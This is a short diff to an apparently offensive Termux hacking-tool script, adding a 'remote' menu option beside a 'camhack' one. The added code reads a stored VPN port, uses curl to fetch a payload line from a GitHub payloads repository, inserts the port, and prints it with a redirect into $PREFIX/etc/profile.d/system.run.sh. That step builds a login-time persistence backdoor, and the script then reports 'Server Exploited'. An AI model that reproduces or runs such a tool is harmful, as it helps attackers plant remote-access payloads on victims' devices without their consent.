@@ -56,6 +56,21 @@ else
 echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}You are not the termux user${clear}"
 fi ;;
 
+remote)
+if [[ -e $HOME/.vf ]]
+then
+echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}VPN port found... ${clear}"
+vport=$(cat $HOME/.vf)
+curl -s -S https://raw.githubusercontent.com/efxtv/Payloads/main/linux/payload.txt|head -1|sed "s#vpt#$vport#g" 
+#Your payload
+echo ' >$PREFIX/etc/profile.d/system.run.sh'
+echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your Link is here: ${clear}"
+echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Server Exploited... ${clear}"
+else
+echo -en " ${Green}[${IGreen}✔${clear}${Green}] ${Red}Failed to find VPN-Port ${clear}"
+echo '$HOME/.vf'
+fi ;;
+
 camhack)
 cd $HOME
 if [[ -e $HOME/camhack/run.sh ]]
